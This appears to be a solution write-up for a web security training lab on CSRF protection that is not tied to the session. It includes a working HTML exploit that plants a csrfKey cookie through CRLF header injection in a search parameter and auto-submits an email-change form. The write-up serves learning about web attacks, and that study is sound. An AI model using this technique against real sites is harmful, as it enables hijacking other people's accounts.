
LABNot solved

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`

------------------

# Solution


The server uses a separate `csrfKey` cookie paired with the csrf token for CSRF protection, but neither is tied to the session cookie. Any matching csrfKey/token pair works for any user.

The attack requires injecting your csrfKey cookie into the victim’s browser. The site’s search function sets a `LastSearchTerm` cookie from user input, which is vulnerable to CRLF injection — injecting `%0d%0aSet-Cookie:csrfKey=YOUR-VALUE` into the search parameter adds a second `Set-Cookie` header in the response.

The exploit uses an `img` tag to trigger the cookie injection, then submits the CSRF form with the matching token:

```
<html>
  <body>
    <img src="https://0a9500c503a2a9ba802358ab00a5002e.web-security-academy.net/?search=test%0d%0aSet-Cookie:csrfKey=XvGJW2QzHRPt9tEXUh9GjFnOore5651o%3b%20SameSite=None" onerror="document.forms[0].submit()" />
    <form action="https://0a9500c503a2a9ba802358ab00a5002e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
      <input type="hidden" name="csrf" value="pmCHEUujDo88P4UpuWh8KU7anu6ZGPd9" />
    </form>
  </body>
</html>
```


The victim’s browser sends their own session cookie (identifying them) plus your injected csrfKey cookie, and the server accepts it because it never checks if the csrfKey belongs to that session. Tokens are single-use so you must drop the intercepted request to keep the token alive.